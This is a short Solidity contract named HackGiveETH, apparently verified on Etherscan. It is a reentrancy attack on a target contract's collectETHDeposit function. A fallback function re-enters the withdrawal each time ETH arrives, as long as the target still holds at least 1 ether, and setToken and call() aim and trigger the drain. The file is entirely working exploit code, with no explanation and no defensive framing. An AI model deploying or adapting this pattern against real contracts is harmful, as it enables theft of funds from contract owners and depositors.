/**
 *Submitted for verification at Etherscan.io on 2022-04-30
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.8;

interface GiveETH {
    function collectETHDeposit() external returns (bool);
}
contract HackGiveETH {



GiveETH public token;
address public add ;

uint public whatis1eth = 1 ether;

fallback () external payable {
   if (msg.sender.balance < 1 ether) {
       return;
    }
    else {
   token.collectETHDeposit();
    }

}

function setToken (address tkn) external {
token = GiveETH(tkn);
add = tkn;
}


function call () external {
    token.collectETHDeposit();
}

function balance (address bal) public view returns (uint x){
   x = bal.balance;
}
}